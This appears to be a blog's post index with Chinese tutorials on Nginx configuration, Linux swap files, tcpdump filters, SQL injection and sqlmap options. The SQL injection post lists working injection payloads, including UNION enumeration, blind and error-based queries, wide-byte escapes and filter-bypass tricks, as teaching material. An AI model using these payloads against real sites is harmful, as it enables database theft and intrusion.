^~ /upload/down/ {\nalias /data/web/dts/dtsfile/down/;\ninternal;\n\n2.9 try_files\n字面意思是尝试，后面可以接多个目录或者文件，比如kohana框架：\ntry_files $uri /index.php?$query_string;\n先看是否有URL这个文件，没有的话再调用index.php来处理，或者支持状态码处理：\ntry_files /foo /bar/ =404;\n没有这两个文件的话返回404状态。\n\n2.10 auth 认证\n可以做简单的用户登录认证方式，其中的passwd_file得通过apache的htpasswd命令来生成。\nauth_basic \"Restricted\";\nauth_basic_user_file passwd_file;\n认证通过之后每次访问会在头部添加Authorization字段包含用户名密码的base64加密密文给服务端。\n\n2.11 Gzip\n普通的线上web站点gzip压缩是必须要开的，压缩一些文本类型的文件再返回给用户。\n注意必须手动指定全需要压缩的类型，比如css、js之类的，线上配置如下：\ngzip on;\ngzip_min_length  2048;\ngzip_buffers     4 16k;\ngzip_vary   on;\ngzip_http_version 1.1;\ngzip_types  text/plain  text/css text/xml application/xml application/javascript application/x-javascript ;\n\n2.12 mime 配置\n很久以前基本是忽略这个配置，但手游流行之后就发现异常了，需要让手机浏览器知道返回的apk后缀是什么类型，否则类似IE浏览器会以zip后缀返回，需要加上：\napplication/vnd.android.package-archive apk;\napplication/iphone pxl ipa;\n\n2.13 限速\n限速包括限制请求的并发数和请求的下载速度。\n简单的限制某个线程的下载速度就直接加上一句话就可以了：\nlimit_rate 1024k;\n要限制某个IP的并发数之类的就需要用ngx_http_limit_req_module和ngx_http_limit_conn_module模块了，不过是默认就编译好的。\n比如使用一个 10M 大小的状态缓存区，针对每个IP每秒只接受20次的请求：\nlimit_req_zone $binary_remote_addr zone=NAME:10m rate=20r/s;\n\n2.14 location 匹配\nlocation匹配有多种方式，常见的比如\nlocation  = / \nlocation  / \nlocation ^~ /test{\n是有优先级的，直接 ”=” 的优先级是最高的，一般就用”~”这个符号来匹配php就好了，不过是区分了大小写的：\nlocation ~ .*\\.php$\n\n2.15 文件缓存\n返回给用户的文件一般都配置了过期时间，让浏览器缓存起来。\n比如缓存14天：\nexpires 14d;\n针对某些特殊的文件就需要location匹配之后进行禁止缓存配置：\nadd_header Cache-Control no-cache;\nadd_header Cache-Control no-store;\nexpires off;\n\n2.16 缓存文件\nNGINX可以作为ATS这样的缓存服务器来缓存文件，配置也比较简单，不过我们很少用，除非一些特殊的场合，参考配置：\n#先在全局下面定义好缓存存放的目录\nproxy_cache_path  /data/cache/ levels=1:2 keys_zone=cache_one:10m inactive=7d max_size=10g;\nproxy_temp_path   /data/cache/proxy_temp_path;\nproxy_cache_key   $host$uri$is_args$args;\n#然后在server里面的location匹配好目的文件，加入下一段即可\nproxy_cache cache_one;\nproxy_cache_valid 200 304 24h;\nproxy_cache_valid any 10m;\nproxy_pass https://$host;\nproxy_cache_key $host$uri$is_args$args;\nadd_header  Nginx-Cache \"$upstream_cache_status\"; 3. 内置模块\n\n3.内置模块\nNGINX含有大量的模块可以支持多种复杂的需求，比如源码目录src/http/modules里面就有很多c模块的代码，或者直接通过./configure –help|grep module来查看有哪些内置模块，编译时候直接加上就可以了。\n除了NGINX内置的模块，网络上还有很多第三方的模块，可以通过编译时候加参数–add-module=PATH指定模块源码来编译。\n下面介绍一些我们线上用过而且比较赞的内置模块。\n\n3.1 stream\n端口转发的模块，从NGINX 1.9版本才开始支持，包含tcp和udp的支持，和IPTABLES相比这个虽然是应用层，会监听端口，但是配置起来很方便，比IPTABLES灵活，在tcp模块下面添加类似vhost的server就可以了，方便自动化管理，参考配置：\nserver {\n    listen PORT;\n    proxy_pass IP:PORT;\n    access_log /data/logs/tcp/PORT.log;\n}\n\n3.2 http_realip_module\nNGINX反向代理之后，如何让后端web直接获取到的IP不是反向代理的iP，而是直接获取到用户的真实IP呢，就需要这个模块了，不需要代码那里再做类似X-Real-IP的变量特殊判断。\n\n3.3 http_slice_module\n在做CDN时候可以用到，让一个大文件分片，分成多个小文件通过206断点续传到后端，然后再组合起来，避免大文件直接回源导致多副本和多次回源的问题。\n\n3.4 http_secure_link_module\n前面说到的防盗链可以用这个来做，但是这个一般是针对那种文件下载时候用到的，比如从网页下载时候，服务端生成一个加密URL给用户，然后这个URL有过期时间之类的，避免此URL被多次分享出去，不过普通的素材加载还是用普通的防盗链即可。\n\n3.5 http_sub_module\n替换响应给用户的内容，相对于sed之后再返回，比如可以在需要临时全局修改网站背景或者title时候可以一次性处理好。\n\n4.扩展项目\n简单介绍下大名鼎鼎的两个基于NGINX的扩展项目，也是我们线上有很多地方用到的。\n\n4.1 openresty\n集成lua脚本，几乎可以完成任何普通web相关的需求。\n比如URL加密进行防劫持和防盗链，服务端动态生成一串aes加密的URL给CDN，CDN的openresty解密之后用普通的URL转发到后端，然后再返回给用户正确的内容。\n\n4.2 tengine\n淘宝的NGINX修改版，实现了很多nginx的收费功能或者是特殊功能，比如动态加载、concat合并请求，动态解析等。\n我们python开发的后台基本都是用的这个版本，主要是利用了concat的合并素材的功能。\n``` \n\nMore Info: [NGINX](https://nginx.org/)\n","tags":["Nginx"],"categories":["Nginx"]},{"title":"Linux上创建交换分区","url":"/posts/84de9b61/","content":"\n# Linux上创建交换分区\n\n>**创建交换分区还是比较简单，我这边就不多少什么。**\n\n----------\n\n\n##  正文\n``` bash\n# 创建交换分区，并开机启动\n$ dd if=/dev/zero of=/swapfile bs=1M count=4096\n$ mkswap /swapfile\n$ chmod 600 /swapfile\n$ vim /etc/fstab\n# /swapfile\tswap                      swap  defaults  0 0\n$ swapon -a\n$ free -h\n\n# 释放内存\n$ sync\n$ echo 1 > /proc/sys/vm/drop_caches\n$ echo 2 > /proc/sys/vm/drop_caches\n$ echo 3 > /proc/sys/vm/drop_caches\n```","tags":["Linux"],"categories":["Linux"]},{"title":"tcpdump使用教程","url":"/posts/f32ddc11/","content":"\n\n#### tcpdump使用教程\n>**一般情况下，非HTTP协议的网络分析，在服务器端用tcpdump比较多，在客户端用wireshark比较多，两个抓包软件的语法是一样的。**\n### 一、基本语法\n **1.1、过滤主机**\n抓取所有经过eth1，目的或源地址是192.168.1.1的网络数据\n`tcpdump -i eth1 host 192.168.1.1`\n指定源地址\n`tcpdump -i eth1 src host 192.168.1.1`\n指定目的地址\n`tcpdump -i eth1 dst host 192.168.1.1`\n<!-- more -->\n**1.2、过滤端口**\n抓取所有经过eth1，目的或源端口是25的网络数据\n`tcpdump -i eth1 port 25`\n指定源端口\n`tcpdump -i eth1 src port 25`\n指定目的端口\n`tcpdump -i eth1 dst port 25`\n**1.3、网络过滤**\n`tcpdump -i eth1 net 192.168\ntcpdump -i eth1 src net 192.168\ntcpdump -i eth1 dst net 192.168`\n**1.4、协议过滤**\n`tcpdump -i eth1 arp`\n`tcpdump -i eth1 ip`\n`tcpdump -i eth1 tcp`\n`tcpdump -i eth1 udp`\n`tcpdump -i eth1 icmp`\n**1.5、常用表达式**\n`非 : ! or \"not\" (去掉双引号)  \n且 : && or \"and\"  \n或 : || or \"or\"`\n抓取所有经过eth1，目的地址是192.168.1.254或192.168.1.200端口是80的TCP数据\n`tcpdump -i eth1 '((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))'`\n抓取所有经过eth1，目标MAC地址是00:01:02:03:04:05的ICMP数据\n`tcpdump -i eth1 '((icmp) and ((ether dst host 00:01:02:03:04:05)))'`\n抓取所有经过eth1，目的网络是192.168，但目的主机不是192.168.1.200的TCP数据\n`tcpdump -i eth1 '((tcp) and ((dst net 192.168) and (not dst host 192.168.1.200)))'`\n二、高级包头过滤\n首先了解如何从包头过滤信息\n`proto[x:y]          : 过滤从x字节开始的y字节数。比如ip[2:2]过滤出3、4字节（第一字节从0开始排）`\n`proto[x:y] & z = 0  : proto[x:y]和z的与操作为0`\n`proto[x:y] & z !=0  : proto[x:y]和z的与操作不为0`\n`proto[x:y] & z = z  : proto[x:y]和z的与操作为z`\n`proto[x:y] = z      : proto[x:y]等于z`\n操作符 : >, <, >=, <=, =, !=\n\n**2.1、IP头**\n``` bash\n0                   1                   2                   3\n 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |Version|  IHL  |Type of Service|          Total Length         |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |         Identification        |Flags|      Fragment Offset    |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |  Time to Live |    Protocol   |         Header Checksum       |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |                       Source Address                          |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |                    Destination Address                        |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |                    Options                    |    Padding    | <-- optional\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |                            DATA ...                           |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n```\n \n本文只针对IPv4。\n\n2.2、IP选项设置了吗？\n“一般”的IP头是20字节，但IP头有选项设置，不能直接从偏移21字节处读取数据。IP头有个长度字段可以知道头长度是否大于20字节。\n\n```\n +-+-+-+-+-+-+-+-+\n |Version|  IHL  |\n +-+-+-+-+-+-+-+-+\n```\n通常第一个字节的二进制值是：01000101，分成两个部分：\n\n0100 = 4 表示IP版本 0101 = 5 表示IP头32 bit的块数，5 x 32 bits = 160 bits or 20 bytes\n\n如果第一字节第二部分的值大于5，那么表示头有IP选项。\n\n下面介绍两种过滤方法（第一种方法比较操蛋，可忽略）：\n\na. 比较第一字节的值是否大于01000101，这可以判断IPv4带IP选项的数据和IPv6的数据。\n\n01000101十进制等于69，计算方法如下（小提示：用计算器更方便）\n```\n0 : 0  \\\n1 : 2^6 = 64 \\ 第一部分 (IP版本)\n0 : 0   /\n0 : 0  /\n-\n0 : 0  \\\n1 : 2^2 = 4  \\ 第二部分 (头长度)\n0 : 0   /\n1 : 2^0 = 1 /\n64 + 4 + 1 = 69\n```\n如果设置了IP选项，那么第一自己是01000110（十进制70），过滤规则：\n\n`tcpdump -i eth1 'ip[0] > 69'`\nIPv6的数据也会匹配，看看第二种方法。\n\nb. 位操作\n\n0100 0101 : 第一字节的二进制\n0000 1111 : 与操作\n<=========\n0000 0101 : 结果\n\n正确的过滤方法\n`tcpdump -i eth1 'ip[0] & 15 > 5'`\n或者\n`tcpdump -i eth1 'ip[0] & 0x0f > 5'`\n**2.3、分片标记**\n当发送端的MTU大于到目的路径链路上的MTU时就会被分片，这段话有点拗口，权威的请参考《TCP/IP详解》。唉，32借我的书没还，只能凑合写，大家记得看书啊。\n\n分片信息在IP头的第七和第八字节：\n```\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |Flags|      Fragment Offset    |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n```\nBit 0: 保留，必须是0\nBit 1: (DF) 0 = 可能分片, 1 = 不分片\nBit 2: (MF) 0 = 最后的分片, 1 = 还有分片\n\nFragment Offset字段只有在分片的时候才使用。\n\n要抓带DF位标记的不分片的包，第七字节的值应该是：\n\n01000000 = 64\n\n`tcpdump -i eth1 'ip[6] = 64'`\n**2.4、抓分片包**\n匹配MF，分片包\n`tcpdump -i eth1 'ip[6] = 32'`\n最后分片包的开始3位是0，但是有Fragment Offset字段。\n\n匹配分片和最后分片\n`tcpdump -i eth1 '((ip[6:2] > 0) and (not ip[6] = 64))'`\n测试分片可以用下面的命令：\n\n`ping -M want -s 3000 192.168.1.1`\n**2.5、匹配小TTL**\nTTL字段在第九字节，并且正好是完整的一个字节，TTL最大值是255，二进制为11111111。\n\n可以用下面的命令验证一下：\n\n```\n$ ping -M want -s 3000 -t 256 192.168.1.200\nping: ttl 256 out of range\n +-+-+-+-+-+-+-+-+\n |  Time to Live |\n +-+-+-+-+-+-+-+-+\n```\n在网关可以用下面的命令看看网络中谁在使用traceroute\ntcpdump -i eth1 'ip[8] < 5'\n**2.6、抓大于X字节的包**\n大于600字节\n`tcpdump -i eth1 'ip[2:2] > 600'`\n**2.7、更多的IP过滤**\n首先还是需要知道TCP基本结构，再次推荐《TCP/IP详解》，卷一就够看的了，避免走火入魔。\n\nTCP头\n```\n 0                   1                   2                   3\n 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |          Source Port          |       Destination Port        |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |                        Sequence Number                        |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |                    Acknowledgment Number                      |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |  Data |       |C|E|U|A|P|R|S|F|                               |\n | Offset|  Res. |W|C|R|C|S|S|Y|I|            Window             |\n |       |       |R|E|G|K|H|T|N|N|                               |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |           Checksum            |         Urgent Pointer        |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |                    Options                    |    Padding    |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n |                             data                              |\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n```\n抓取源端口大于1024的TCP数据包\ntcpdump -i eth1 'tcp[0:2] > 1024'\n匹配TCP数据包的特殊标记\nTCP标记定义在TCP头的第十四个字节\n```\n +-+-+-+-+-+-+-+-+\n |C|E|U|A|P|R|S|F|\n |W|C|R|C|S|S|Y|I|\n |R|E|G|K|H|T|N|N|\n +-+-+-+-+-+-+-+-+\n```\n重复一下TCP三次握手，两个主机是如何勾搭的：\n\n源发送SYN\n目标回答SYN, ACK\n源发送ACK\n没女朋友的童鞋要学习一下：\n1. MM，你的手有空吗？--\n2. 有空，你呢？\\~~\n3. 我也有空 *_*\n\n失败的loser是酱紫的：\n1. MM，这是你掉的板砖吗？(SYN) ￣▽￣\n2. 不是，找拍啊？(RST-ACK) ˋ﹏ˊ\n\n只抓SYN包，第十四字节是二进制的00000010，也就是十进制的2\n`tcpdump -i eth1 'tcp[13] = 2'`\n抓SYN, ACK （00010010 or 18）\n`tcpdump -i eth1 'tcp[13] = 18'`\n抓SYN或者SYN-ACK\n`tcpdump -i eth1 'tcp[13] & 2 = 2'`\n用到了位操作，就是不管ACK位是啥。\n\n抓PSH-ACK\n`tcpdump -i eth1 'tcp[13] = 24'`\n抓所有包含FIN标记的包（FIN通常和ACK一起，表示幽会完了，回见）\n`tcpdump -i eth1 'tcp[13] & 1 = 1'`\n抓RST（勾搭没成功，伟大的greatwall对她认为有敏感信息的连接发RST包，典型的棒打鸳鸯）\n`tcpdump -i eth1 'tcp[13] & 4 = 4'`\n\n\n**2.8、大叔注**\ntcpdump考虑了一些数字恐惧症者的需求，提供了部分常用的字段偏移名字：\n\nicmptype (ICMP类型字段)\nicmpcode (ICMP符号字段)\ntcpflags (TCP标记字段)\n\nICMP类型值有：\n\nicmp-echoreply, icmp-unreach, icmp-sourcequench, icmp-redirect, icmp-echo, icmp-routeradvert, icmp-routersolicit, icmp-timxceed, icmp-paramprob, icmp-tstamp, icmp-tstampreply, icmp-ireq, icmp-ireqreply, icmp-maskreq, icmp-maskreply\n\nTCP标记值：\n\ntcp-fin, tcp-syn, tcp-rst, tcp-push, tcp-push, tcp-ack, tcp-urg\n\n这样上面按照TCP标记位抓包的就可以写直观的表达式了：\n\n只抓SYN包\n`tcpdump -i eth1 'tcp[tcpflags] = tcp-syn'`\n抓SYN, ACK\n`tcpdump -i eth1 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack != 0'`\n**2.9、抓SMTP数据**\n`tcpdump -i eth1 '((port 25) and (tcp[(tcp[12]>>2):4] = 0x4d41494c))'`\n抓取数据区开始为\"MAIL\"的包，\"MAIL\"的十六进制为0x4d41494c。\n\n**2.10、抓HTTP GET数据**\n`tcpdump -i eth1 'tcp[(tcp[12]>>2):4] = 0x47455420'`\n\"GET \"的十六进制是47455420\n\n**2.11、抓SSH返回**\n`tcpdump -i eth1 'tcp[(tcp[12]>>2):4] = 0x5353482D'`\n\"SSH-\"的十六进制是0x5353482D\n\n`tcpdump -i eth1 '(tcp[(tcp[12]>>2):4] = 0x5353482D) and (tcp[((tcp[12]>>2)+4):2] = 0x312E)'`\n抓老版本的SSH返回信息，如\"SSH-1.99..\"\n\n**三、大叔注**\n如果是为了查看数据内容，建议用tcpdump -s 0 -w filename把数据包都保存下来，然后用wireshark的Follow TCP Stream/Follow UDP Stream来查看整个会话的内容。\n\n-s 0是抓取完整数据包，否则默认只抓68字节。\n\n另外，用tcpflow也可以方便的获取TCP会话内容，支持tcpdump的各种表达式。\n\n**3.1、UDP头**\n```\n  0      7 8     15 16    23 24    31\n +--------+--------+--------+--------+\n |     Source      |   Destination   |\n |      Port       |      Port       |\n +--------+--------+--------+--------+\n |                 |                 |\n |     Length      |    Checksum     |\n +--------+--------+--------+--------+\n |                                   |\n |              DATA ...             |\n +-----------------------------------+\n```\n抓DNS请求数据\n`tcpdump -i eth1 udp dst port 53`\n**3.2、其他**\n-c参数对于运维人员来说也比较常用，因为流量比较大的服务器，靠人工CTRL+C还是抓的太多，甚至导致服务器宕机，于是可以用-c参数指定抓多少个包。\n\n`time tcpdump -nn -i eth0 'tcp[tcpflags] = tcp-syn' -c 10000 > /dev/null`\n上面的命令计算抓10000个SYN包花费多少时间，可以判断访问量大概是多少。\n\n\n","tags":["网络工具"],"categories":["网络工具"]},{"title":"SQL注入之基础原理","url":"/posts/6c6819bc/","content":"\n### 0x01 SQL注入的产生\n>SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。\n\n### 0x02 SQL注入原理\n>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。\n<!-- more -->\n>根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。\n\n### 0x03 SQL注入的类型\n**常见的SQL注入有以下几种**\n+ 按变量类型分类\n  - 数字型\n  - 字符型\n+ 按HTTP提交方式分类\n  - GET型注入\n  - POST型注入\n  - Cookie注入\n  - HTTP头部注入\n+ 按注入方式分类\n  - 报错注入\n  - 盲注\n  - UNION注入\n  - 布尔型注入\n  - 时间注入\n+ 宽字节注入（主要针对GBK编码类型）\n\n### 0x04 数据库\n**常见数据库类型**\nMySQL\n>MySQL5.0之后和5.0之前版本有很大的区别，,MySQL5.0以上存在一个存储着数据库信息的信息数据库--INFORMATION_SCHEMA ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 而5.0以下没有。\n\ninformation_schema\n>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息\n\nSCHEMATA\n>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等\n\nTABLES\n>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等\n\nCOLUMNS\n>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等\n\nMSSQL\n>注入靠比大小。\n\nOracle\n>Oracle的数据类型是强匹配的(MySQL有弱匹配的味道)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。\n\nPostgreSQL\n>PostgreSQL是一款关系型数据库，广泛应用在Web编程当中，由于其语法与MySQL不尽相同，所以其SQL注入又自成一派。\n\nAccess\n>没有库结构，只有表和列，只能通过字典爆破。\n\n### 0x05 基于手工注入流程\n>要从select语句中获取有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。\n\n**1. MySQL >= 5.0**\n获取字段数\n`order by n`  /*通过不断尝试改变n的值来观察页面反应确定字段数*/\n\n获取系统数据库名\n 在MySQL >5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中\n `select null,null,schema_name from information_schema.schemata`\n        \n获取当前数据库名\n`select null,null,...,database()`\n        \n获取数据库中的表\n`select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database()`\n或\n`select null,null,...,table_name from information_schema.tables where table_schema=database() limit 0,1`\n\n获取表中的字段\n这里假设已经获取到表名为user\n`select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'`\n    \n获取各个字段值\n这里假设已经获取到表名为user，且字段为username和password\n`select null,group_concat(username,password) from users`\n\n**2. MySQL < 5.0**\nMySQL < 5.0 没有信息数据库information_schema，所以只能手工枚举爆破（二分法思想）。\n该方式通常用于盲注。\n相关函数\n`length(str)` ：返回字符串str的长度\n`substr(str, pos, len)` ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始\n`mid(str,pos,len)` ：跟上面的一样，截取字符串\n`ascii(str)` ：返回字符串str的最左面字符的ASCII代码值\n`ord(str)` ：将字符或布尔类型转成ascll码\n`if(a,b,c)` ：a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0\n\n基于布尔的盲注\n`and ascii(substr((select database()),1,1))>64` /*判断数据库名的第一个字符的ascii值是否大于64*/\n\n基于时间的盲注\n`id=1 union select if(SUBSTRING(user(),1,4)='root',sleep(4),1),null,null` /*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*/\n\n\n### 0x06 常用注入方式\n注释符：\n`#`\n-- (有空格)或--+\n`/**/`\n\n内联注释：\n`/*！...*/`\n\nunion注入\n`id =-1 union select 1,2,3`   /*获取字段*/\n\nBoolean注入\n`id=1' substr(database(),1,1)='t'--+`     /*判断数据名长度*/\n\n报错注入\nfloor()和rand()\n`union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a`       /*利用错误信息得到当前数据库名*/\n\nextractvalue()\n`id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))`\n\nupdatexml()\n`id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))`\n\ngeometrycollection()\n`id=1 and geometrycollection((select * from(select * from(select user())a)b))`\n\nmultipoint()\n`id=1 and multipoint((select * from(select * from(select user())a)b))`\n\npolygon()\n`id=1 and polygon((select * from(select * from(select user())a)b))`\n\nmultipolygon()\n`id=1 and multipolygon((select * from(select * from(select user())a)b))`\n\nlinestring()\n`id=1 and linestring((select * from(select * from(select user())a)b))`\n\nmultilinestring()\n`id=1 and multilinestring((select * from(select * from(select user())a)b))`\n\nexp()\n`id=1 and exp(~(select * from(select user())a))`\n\n时间注入\n`id = 1 and if(length(database())>1,sleep(5),1)`\n\n堆叠查询注入\n`id = 1';select if(sub(user(),1,1)='r',sleep(3),1)%23`\n\n二次注入\n假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册username=test'，接下来访问xxx.php?username=test'，页面返回id=22；\n接下来再次发起请求xxx.php?id=22，这时候就有可能发生sql注入，比如页面会返回MySQL的错误。\n访问xxx.php?id=test' union select 1,user(),3%23，获得新的id=40，得到user()的结果，利用这种注入方式会得到数据库中的值。\n\n宽字节注入\n利用条件：\n1.查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()或其过滤函数\n2.数据库的编码为GBK\n利用方式\n`id = -1%DF' union select 1,user(),3,%23`\n在上述条件下，单引号'被转义为%5c，所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。\n\nCookie注入\n当发现在url中没有请求参数，单数却能得到结果的时候，可以看看请求参数是不是在cookie中，然后利用常规注入方式在cookie中注入测试即可，只是注入的位置在cookie中，与url中的注入没有区别。\n`Cookie: id = 1 and 1=1`\n\nbase64注入\n对参数进行base64编码，再发送请求。\n说明：id=1'，1的base64编码为MSc=，而=的url编码为%3d，所以得到以下结果：\n`id=MSc%3d`\n\nXFF注入\nXFF(X-Forward-For)，简称XFF头，它代表客户端真实的ip地址\n`X-Forward-For：127.0.0.1' select 1,2,user()`\n\n### 0x07 SQL注入绕过技术\n>**大小写绕过**\n**双写绕过**\n**编码绕过**（url全编码、十六进制）\n**内联注释绕过**\n**关键字替换**\n**逗号绕过**\nsubstr、mid()函数中可以利用from to来摆脱对逗号的利用；\nlimit中可以利用offset来摆脱对逗号的利用\n**比较符号( >、< )绕过**（greatest、between and)\n**逻辑符号的替换**（and=&& or=|| xor=| not=!）\n**空格绕过**（用括号，+等绕过）\n**等价函数绕过**\n`hex()、bin()=ascii()`\n`concat_ws()=group_concat()`\n`mid()、substr()=substring()`\n**http参数污染**\n`(id=1 union select+1,2,3+from+users+where+id=1–`变为`id=1 union select+1&id=2,3+from+users+where+id=1–)`\n**缓冲区溢出绕过** \n`(id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36–+`\n其中`0xAAAAAAAAAAAAAAAAAAAAA`这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)\n","tags":["SQL注入"],"categories":["SQL注入"]},{"title":"sqlmap的使用文档","url":"/posts/a0c8df84/","content":"\n\n#### SQLMap中英文对照\n>**sqlmap文档地址:https://github.com/sqlmapproject/sqlmap/wiki/Usage**\n>**摘取了其中的命令参数格式如下**\n<!-- more -->\n```bash\nUsage: python sqlmap.py [options]\nOptions（选项）:\n-h, --help            Show basic help message and exit        显示此帮助消息并退出\n-hh                   Show advanced help message and exit     展示先进的帮助信息并退出\n--version             Show program's version number and exit  显示程序的版本号并退出\n-v VERBOSE            Verbosity level: 0-6 (default 1)        详细级别：0-6（默认为1） \n\nTarget（目标）:\nAt least one of these options has to be provided to define the  \ntarget(s)\n以下至少需要设置其中一个选项，设置目标URL。\n \n-d DIRECT           Connection string for direct database connection        直接连接到数据库。\n-u URL, --url=URL   Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")   目标URL。\n-l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file   解析目标(s)从Burp或WebScarab代理日志文件\n-x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file          解析目标(s)从远程站点地图文件(.xml)\n-m BULKFILE         Scan multiple targets given in a textual file           扫描文本文件中给出的多个目标\n-r REQUESTFILE      Load HTTP request from a file                           从文件加载HTTP请求\n-g GOOGLEDORK       Process Google dork results as target URLs              处理Google dork的结果作为目标URL。\n-c CONFIGFILE       Load options from a configuration INI file              从INI配置文件中加载选项。\n \nRequest（请求）:\n\nThese options can be used to specify how to connect to the target URL   这些选项可以用来指定如何连接到目标URL。\n--method=METHOD     Force usage of given HTTP method (e.g. PUT)          强制使用给定的HTTP方法（e.g. PUT）\n--data=DATA         Data string to be sent through POST                  通过POST发送的数据字符串\n--param-del=PARA..  Character used for splitting parameter values        用于拆分参数值的字符\n--cookie=COOKIE     HTTP Cookie header value                             HTTP Cookie头的值\n--cookie-del=COO..  Character used for splitting cookie values           用于分割Cookie值的字符\n--load-cookies=L..  File containing cookies in Netscape/wget format      包含Netscape / wget格式的cookie的文件\n--drop-set-cookie   Ignore Set-Cookie header from response               从响应中忽略Set-Cookie头\n--user-agent=AGENT  HTTP User-Agent header value                         指定 HTTP User - Agent头  \n--random-agent      Use randomly selected HTTP User-Agent header value   使用随机选定的HTTP User - Agent头 \n--host=HOST         HTTP Host header value                                HTTP主机头值\n--referer=REFERER   HTTP Referer header value                             指定 HTTP Referer头\n-H HEADER, --hea..  Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")      额外header\n--headers=HEADERS   Extra headers (e.g. \"Accept-Language: fr\\nETag: 123\") 额外header\n--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI) HTTP认证类型(Basic, Digest, NTLM or PKI)\n--auth-cred=AUTH..  HTTP authentication credentials (name:password)       HTTP认证凭证(name:password)\n--auth-file=AUTH..  HTTP authentication PEM cert/private key file         HTTP认证 PEM认证/私钥文件\n--ignore-401        Ignore HTTP Error 401 